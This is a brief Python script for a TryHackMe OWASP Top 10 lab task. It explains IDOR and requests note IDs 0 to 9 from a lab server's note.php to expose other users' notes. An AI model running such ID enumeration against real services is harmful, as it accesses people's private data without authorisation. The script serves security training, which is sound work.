#!/usr/bin/env python3
# Copyright 2020 David Boyd, all rights reserved
# Program: python-requests.py
# Description:
#     [URL] https://tryhackme.com/room/owasptop10
#     [THM] OWASP Top 10
#     [Task 5] Broken Access Control (IDOR Challenge)
# Date: 2020-10-28
# Revised:
# REF: https://www.w3schools.com/python/module_requests.asp

import requests

# Print message
instructions = "To save to output file:\n\t./python-requests.py > outfile.html"
IDOR = "IDOR (Insecure Direct Object Reference)"\
        "\n\tis the act of exploiting a misconfiguration in the way user"\
        "\n\tinput is handled, to access resources you wouldn't ordinarily"\
        "\n\tbe able to access.  IDOR is a type of access control" \
        "\n\tvulnerability."

task = "Change the URL parameter to gain access to other users' information."

print(instructions, "\n")
print(IDOR, "\n")
print("Your Task:", task)

# Iterate URL params
for i in range (0, 10):

    url = "http://10.10.140.34/note.php?note=" + str(i)

    print("\n=================================================")
    print("[", i, "]: ", url, sep="")
    print("=================================================\n")

    webpage = requests.get(url)

    print(webpage.text)

